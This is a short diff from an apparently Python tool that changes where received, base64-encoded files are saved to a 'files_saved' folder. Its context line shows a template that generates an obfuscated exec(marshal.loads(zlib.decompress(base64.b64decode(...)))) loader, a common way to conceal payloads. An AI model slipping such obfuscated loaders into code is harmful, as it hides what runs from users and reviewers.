@@ -227,6 +227,6 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
         if not os.path.isdir('files_saved'):
             os.makedirs('files_saved')
 
-        with open(f"{data['uuid']}_{data['file_name']}", 'w') as f:
+        with open(f"files_saved/{data['uuid']}_{data['file_name']}", 'w') as f:
             f.writelines(base64.b64decode(data['file']))
 
